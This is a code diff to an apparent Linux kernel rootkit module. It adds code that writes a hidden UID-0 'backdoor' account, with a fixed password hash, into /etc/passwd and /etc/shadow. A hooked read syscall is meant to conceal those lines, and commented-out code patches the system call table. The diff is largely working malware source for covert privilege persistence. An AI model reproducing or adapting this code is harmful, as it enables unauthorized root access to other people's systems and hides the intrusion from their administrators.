@@ -45,18 +45,41 @@ psize **find(void) {
 // username is 'backdoor'
 // password is 'backdoor'
 
-#define FILE_NAME "/home/matt/Documents/rootkit/test.txt"
-#define ADDED_LINE "this is the added line\n"
 #define PASSWD_PATH "/etc/passwd"
 #define SHADOW_PATH "/etc/shadow"
-#define PASSWD_STRING "idk"
-#define SHADOW_STRING "idk"
+#define PASSWD_STRING "backdoor:x:0:0:backdoor:/:/bin/bash\n"
+#define SHADOW_STRING "backdoor:$6$dA0/uaf7$vPdpHbTxoH0Xa1xDDhOW0ROQKvx9RkK02h1HPMqIR5XgSx5EX2oiSIZ9.1Sl16KOVIRNpxiOfwifL4ssxhH/W.:18219:0:99999:7:::\n"
+
+
+// some helper functions, so we don't have to write the same thing for passwd and shadow
+
+void add_text_to_file(char* text, char* file_path) {
+
+	// declare variables
+	mm_segment_t fs;
+
+	struct file* filp = filp_open(file_path, O_WRONLY | O_APPEND, 0);
+	if (IS_ERR(filp)) {
+
+		printk(KERN_ALERT "could not open file %s\n", file_path);
+		return;
+	}
+
+	fs = get_fs();
+        set_fs(get_ds());
+
+	vfs_write(filp, text, strlen(text), &filp->f_pos);
+
+        set_fs(fs);
+	filp_close(filp, NULL);
+}
 
 void delete_text_from_file(char* text, char* file_path) {
 
 	// declare variables
 	int size;
 	mm_segment_t fs;
+	char* buf;
 	char* position;
 	int text_size;
 	int offset;
@@ -78,8 +101,7 @@ void delete_text_from_file(char* text, char* file_path) {
 	vfs_llseek(filp, 0, SEEK_SET);
 	printk("file size: %d\n", size);
 
-	char buf[size + 1];
-	buf[size] = 0;
+	buf = kzalloc(size + 1, GFP_KERNEL);
 
 	// set fs
 	fs = get_fs();
@@ -110,9 +132,12 @@ void delete_text_from_file(char* text, char* file_path) {
 	// truncate file
 	do_truncate(filp->f_dentry, new_size, 0, filp);
 
+	// cleanup
         set_fs(fs);
 	filp_close(filp, NULL);
 }
+
+// a read function that hides our added text
 
 asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 
@@ -151,26 +176,12 @@ asmlinkage int backdoor_read(int fd, void* buf, size_t count) {
 	return ret;
 }
 
+// init and remove the backdoor stuff
+
 void add_backdoor(void) {
 
-	// declare variables
-	mm_segment_t fs;
-
-	struct file* filp = filp_open(FILE_NAME, O_WRONLY | O_APPEND, 0);
-	if (IS_ERR(filp)) {
-
-		printk(KERN_ALERT "could not open file %s\n", FILE_NAME);
-		return;
-	}
-
-	fs = get_fs();
-        set_fs(get_ds());
-
-	vfs_write(filp, ADDED_LINE, strlen(ADDED_LINE), &filp->f_pos);
-
-        set_fs(fs);
-
-	filp_close(filp, NULL);
+	add_text_to_file(PASSWD_STRING, PASSWD_PATH);
+	add_text_to_file(SHADOW_STRING, SHADOW_PATH);
 	
 	/*write_cr0(read_cr0() & (~ 0x10000));
 	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
@@ -179,7 +190,8 @@ void add_backdoor(void) {
 
 void remove_backdoor(void) {
 
-	delete_text_from_file(ADDED_LINE, FILE_NAME);
+	delete_text_from_file(PASSWD_STRING, PASSWD_PATH);
+	delete_text_from_file(SHADOW_STRING, SHADOW_PATH);
 
 	/*write_cr0(read_cr0() & (~ 0x10000));
 	xchg(&sys_call_table[__NR_read],o_read);
